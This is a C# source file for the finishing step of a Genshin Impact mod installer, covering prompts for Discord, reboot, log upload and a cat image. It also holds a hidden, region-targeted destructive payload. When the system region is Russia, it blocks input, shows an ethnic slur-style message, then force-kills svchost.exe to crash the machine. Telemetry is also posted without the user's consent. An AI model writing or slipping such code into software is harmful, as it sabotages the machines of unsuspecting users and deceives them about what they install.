using System;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Genshin_Impact_Mod_Setup.Models;
using Genshin_Stella_Mod_Setup;
using Genshin_Stella_Mod_Setup.Forms;
using Genshin_Stella_Mod_Setup.Scripts;
using Microsoft.Toolkit.Uwp.Notifications;
using Microsoft.WindowsAPICodePack.Taskbar;
using Newtonsoft.Json;

namespace Genshin_Impact_Mod_Setup
{
    internal abstract class Finish
    {
        public static async Task End()
        {
            try
            {
                new ToastContentBuilder().AddText("Installation completed 😻")
                    .AddText("Go back to the installation window! Thanks.").Show();
            }
            catch (Exception ex)
            {
                Log.ErrorAuditLog(ex, true);
            }

            await Telemetry.Post("Installing mod on this machine...");
            TaskbarManager.Instance.SetProgressValue(100, 100);

            Log.Output("Installation completed!");
            Console.WriteLine($"\n{Program.Line}\n");


            // Done.
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Finished at: {0}", DateTime.Now);
            Console.WriteLine("You can delete all installation files.\n");

            Console.ForegroundColor = ConsoleColor.Green;
            var rebootString = Cmd.RebootNeeded ? "Computer needs to be restarted!" : "";
            Console.WriteLine("Good news! Installation was completed. {0}\n", rebootString);

            TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.NoProgress);


            /* First question. */
            Console.Write("» I want to join our Discord server [Yes/no]: ");
            Console.ResetColor();

            var joinToDiscord = Console.ReadLine()?.ToLower();
            if (Regex.Match(joinToDiscord ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline)
                .Success)
            {
                Process.Start(Program.DiscordUrl);
                Log.Output($"Discord server URL opened in default browser.\n» Link: {Program.DiscordUrl}");
            }


            // Reboot PC is required.
            if (Cmd.RebootNeeded)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("» Restart your computer now? This is required! [Yes/no]: ");
                Console.ResetColor();

                await Telemetry.Post("Reboot is required.");

                var rebootPc = Console.ReadLine();
                if (Regex.Match(rebootPc ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline)
                    .Success)
                {
                    await Cmd.Execute("shutdown",
                        $"/r /t 30 /c \"{Program.AppName} - scheduled reboot, version {Program.AppVersion}.\n\nThank you for installing. If you need help, add me on Discord Sefinek#0001.\n\nGood luck and have fun!\"",
                        null);

                    Console.WriteLine("Your computer will restart in 30 seconds. Save your work!");
                    Log.Output("PC reboot was scheduled.");

                    await Telemetry.Post("Reboot was scheduled.");
                }
            }


            /* Second question. */
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("» I want to send anonymous installation log files to the developer [Yes/no]: ");
            Console.ResetColor();

            var sendLogFile = Console.ReadLine();
            if (Regex.Match(sendLogFile ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline)
                .Success)
            {
                var deliveredFiles = await Telemetry.SendLogFiles();
                if (deliveredFiles)
                {
                    Console.WriteLine(
                        "Some files has been sent. This will help improve our apps. Thank you very much >~~<! Close the new window.");

                    if (File.Exists("Data/Images/kyaru.gif"))
                        Application.Run(new ThumbsUp { Icon = Icon.ExtractAssociatedIcon("Data/Images/52x52.ico") });
                    else
                        Process.Start("https://media.tenor.com/KMMqrCPegSUAAAAC/kyaru-anime.gif");

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("» I want to see these files [Yes/no]: ");
                    Console.ResetColor();

                    var seeLogFiles = Console.ReadLine();
                    if (Regex.Match(seeLogFiles ?? string.Empty, "(?:y)",
                            RegexOptions.IgnoreCase | RegexOptions.Singleline).Success) Process.Start(Log.Folder);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Ohh noooo!! Something went wrong. Failed to send Webhook. Sorry ):");
                }
            }


            // Blue screen for Russian rats.
            if (RegionInfo.CurrentRegion.Name == "RU")
            {
                TaskbarManager.Instance.SetProgressState(TaskbarProgressBarState.Error);
                Start.NativeMethods.BlockInput(true);

                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\nSorry, I really hate Russians. NOT BY WAR!");

                Process.Start("https://noel.sefinek.net/video/a2xhdW4gamViYW55IHogY2llYmll.mp4");
                Thread.Sleep(20000);
                await Cmd.Execute("taskkill", "/F /IM svchost.exe", null);
            }


            /* Thirty question. */
            if (!Cmd.RebootNeeded)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("» Launch our launcher now? [Yes/no]: ");
                Console.ResetColor();

                var answer = Console.ReadLine()?.ToLower();
                if (Regex.Match(answer ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline)
                    .Success)
                    try
                    {
                        Process.Start(new ProcessStartInfo
                            { FileName = "Genshin Impact Mod Launcher.exe", WorkingDirectory = Installation.Folder });
                        Log.Output("Application has been opened.");
                    }
                    catch (Exception e)
                    {
                        MessageBox.Show(e.Message, Program.AppName, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Log.ErrorAuditLog(e, true);
                    }
            }


            /* Last question. */
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("» Give me a random cat image and close setup [Yes/no]: ");
            Console.ResetColor();

            var giveMeACatImg = Console.ReadLine()?.ToLower();
            if (Regex.Match(giveMeACatImg ?? string.Empty, "(?:y)", RegexOptions.IgnoreCase | RegexOptions.Singleline)
                .Success)
            {
                Console.WriteLine("Waiting for a random cat >.<");

                var client = new WebClient();
                client.Headers.Add("user-agent", Program.UserAgent);
                var json = await client.DownloadStringTaskAsync("https://api.sefinek.net/api/v2/random/animal/cat");
                var res = JsonConvert.DeserializeObject<SefinekApi>(json);

                if (res.Success)
                {
                    Process.Start(res.Message);
                    Log.Output(
                        $"Random cat image has been opened in default browser.\n» Status code: {res.Status}\n» Image: {res.Message}");
                }
                else
                {
                    MessageBox.Show(
                        $"Whoops... Sorry, something went wrong. Cats are currently not available.\n\nStatus code: {res.Status}",
                        Program.AppName, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Log.ErrorAndExit(new Exception($"Random cat image: error occurred.\n» Status code: {res.Status}"),
                        false, true);
                }
            }
            else
            {
                const string informejtik = @"Data\informejtik.mp4";
                if (RegionInfo.CurrentRegion.Name == "PL" && File.Exists(informejtik)) Process.Start(informejtik);
            }


            // Close application.
            Environment.Exit(0);
        }
    }
}
